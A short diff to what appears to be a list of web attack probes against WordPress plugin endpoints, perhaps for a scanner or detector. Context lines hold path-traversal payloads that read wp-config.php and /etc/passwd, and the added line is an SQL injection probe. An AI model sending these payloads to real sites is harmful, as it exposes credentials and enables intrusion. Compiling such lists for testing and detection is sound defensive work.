@@ -7,3 +7,4 @@
 /wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php
 /?hippoo_serve=../../../../../../../etc/passwd
 /?hippoo_serve=../../../../wp-config.php
+/wp-json/vsfw/v1/videos?fields=%28SELECT%20424242*2%29%20as%20id
